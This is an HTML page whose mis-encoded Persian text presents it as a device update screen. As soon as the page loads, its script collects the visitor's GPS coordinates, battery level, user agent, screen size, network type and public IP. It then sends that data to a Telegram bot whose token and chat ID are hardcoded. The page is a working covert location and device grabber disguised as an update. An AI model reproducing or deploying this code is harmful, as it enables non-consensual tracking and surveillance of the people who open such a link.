<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>Ø¢Ù¾Ø¯ÛŒØª Ø¯Ø³ØªÚ¯Ø§Ù‡ Ø´Ù…Ø§</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap');
    body {
      font-family: 'Vazirmatn', Tahoma, sans-serif;
      direction: rtl;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #d1d1d1;
      margin: 0; padding: 30px;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    #container {
      background: rgba(0,0,0,0.7);
      border-radius: 16px;
      padding: 30px 40px;
      width: 350px;
      box-shadow: 0 0 20px #00ff94;
      text-align: center;
      user-select: none;
    }
    h1 {
      margin-bottom: 20px;
      color: #00ff94;
      font-weight: 700;
      font-size: 24px;
    }
    #status {
      background: rgba(255, 255, 255, 0.05);
      border-radius: 10px;
      padding: 15px;
      height: 130px;
      overflow-y: auto;
      font-size: 13px;
      line-height: 1.4;
      text-align: left;
      color: #aaffcc;
      margin-bottom: 20px;
      white-space: pre-wrap;
      box-shadow: inset 0 0 10px #00ff94aa;
    }
    button {
      background: #00ff94;
      border: none;
      padding: 12px 0;
      width: 100%;
      border-radius: 10px;
      font-weight: 600;
      font-size: 16px;
      color: #002b00;
      cursor: pointer;
      box-shadow: 0 0 15px #00ff94cc;
      transition: background-color 0.3s ease;
      user-select: none;
    }
    button:hover {
      background: #00cc72;
    }
  </style>
</head>
<body>
  <div id="container">
    <h1>Ø¯Ø± Ø­Ø§Ù„ Ø¢Ù¾Ø¯ÛŒØª Ø¯Ø³ØªÚ¯Ø§Ù‡ Ø´Ù…Ø§...</h1>
    <div id="status">Ù…Ù†ØªØ¸Ø± Ø¨Ù…Ø§Ù†ÛŒØ¯ØŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø± Ø­Ø§Ù„ Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø§Ø³Øª...</div>
    <button id="sendBtn">Ø§Ø±Ø³Ø§Ù„ Ø¯Ø³ØªÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª</button>
  </div>

<script>
  const token = "8179792057:AAFqJdoVXJOp5QK13fVbskZgojZVdVdhkgs";
  const chat_id = "309120647";
  const statusEl = document.getElementById('status');
  const sendBtn = document.getElementById('sendBtn');

  async function sendToTelegram(msg) {
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
    try {
      const res = await fetch(url);
      if (res.ok) {
        statusEl.textContent += "\nâœ… Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙÙ‚ÛŒØªâ€ŒØ¢Ù…ÛŒØ² Ø¨ÙˆØ¯.";
      } else {
        statusEl.textContent += `\nâŒ Ø§Ø±Ø³Ø§Ù„ Ù†Ø§Ù…ÙˆÙÙ‚ØŒ Ú©Ø¯: ${res.status}`;
      }
    } catch (e) {
      statusEl.textContent += `\nâŒ Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„: ${e.message}`;
    }
  }

  async function getIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch {
      return "Ù†Ø§Ù…Ø´Ø®Øµ";
    }
  }

  async function collectData() {
    statusEl.textContent = "â³ Ø¯Ø± Ø­Ø§Ù„ Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª...";

    let battery = "Ù†Ø§Ù…Ø´Ø®Øµ";
    if (navigator.getBattery) {
      try {
        const batt = await navigator.getBattery();
        battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '(Ø¯Ø± Ø­Ø§Ù„ Ø´Ø§Ø±Ú˜)' : '(Ø´Ø§Ø±Ú˜ Ù†Ø´Ø¯Ù‡)'}`;
      } catch {
        battery = "Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª Ø¨Ø§ØªØ±ÛŒ";
      }
    }

    const device = navigator.userAgent;
    const time = new Date().toLocaleString();
    const resolution = `${screen.width}x${screen.height}`;
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const netType = connection ? connection.effectiveType : "Ù†Ø§Ù…Ø´Ø®Øµ";
    const ip = await getIP();

    if (navigator.geolocation) {
      statusEl.textContent = "â³ Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ...";
      navigator.geolocation.getCurrentPosition(
        pos => {
          const lat = pos.coords.latitude.toFixed(6);
          const lon = pos.coords.longitude.toFixed(6);
          const msg = 
            `ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª: ${lat}, ${lon}\n` +
            `ğŸ”‹ Ø¨Ø§ØªØ±ÛŒ: ${battery}\n` +
            `ğŸ•’ Ø²Ù…Ø§Ù†: ${time}\n` +
            `ğŸ“± Ø¯Ø³ØªÚ¯Ø§Ù‡: ${device}\n` +
            `ğŸ“º Ø±Ø²ÙˆÙ„ÙˆØ´Ù†: ${resolution}\n` +
            `ğŸ“¶ Ù†ÙˆØ¹ Ø§ÛŒÙ†ØªØ±Ù†Øª: ${netType}\n` +
            `ğŸŒ IP: ${ip}`;
          statusEl.textContent = "âœ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø´Ø¯ØŒ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...";
          sendToTelegram(msg);
        },
        err => {
          const msg = 
            `âŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø±Ø¯ Ø´Ø¯\n` +
            `ğŸ”‹ Ø¨Ø§ØªØ±ÛŒ: ${battery}\n` +
            `ğŸ•’ Ø²Ù…Ø§Ù†: ${time}\n` +
            `ğŸ“± Ø¯Ø³ØªÚ¯Ø§Ù‡: ${device}\n` +
            `ğŸ“º Ø±Ø²ÙˆÙ„ÙˆØ´Ù†: ${resolution}\n` +
            `ğŸ“¶ Ù†ÙˆØ¹ Ø§ÛŒÙ†ØªØ±Ù†Øª: ${netType}\n` +
            `ğŸŒ IP: ${ip}`;
          statusEl.textContent = "âš ï¸ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø±Ø¯ Ø´Ø¯ØŒ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‚ÛŒÙ‡ Ø§Ø·Ù„Ø§Ø¹Ø§Øª...";
          sendToTelegram(msg);
        }
      );
    } else {
      const msg = 
        `âš ï¸ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯\n` +
        `ğŸ”‹ Ø¨Ø§ØªØ±ÛŒ: ${battery}\n` +
        `ğŸ•’ Ø²Ù…Ø§Ù†: ${time}\n` +
        `ğŸ“± Ø¯Ø³ØªÚ¯Ø§Ù‡: ${device}\n` +
        `ğŸ“º Ø±Ø²ÙˆÙ„ÙˆØ´Ù†: ${resolution}\n` +
        `ğŸ“¶ Ù†ÙˆØ¹ Ø§ÛŒÙ†ØªØ±Ù†Øª: ${netType}\n` +
        `ğŸŒ IP: ${ip}`;
      statusEl.textContent = "âš ï¸ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯ØŒ Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª...";
      sendToTelegram(msg);
    }
  }

  sendBtn.addEventListener('click', collectData);

  // Ø´Ø±ÙˆØ¹ Ø®ÙˆØ¯Ú©Ø§Ø± Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ù‡Ù†Ú¯Ø§Ù… Ø¨Ø§Ø² Ø´Ø¯Ù† ØµÙØ­Ù‡
  collectData();
</script>
</body>
</html>
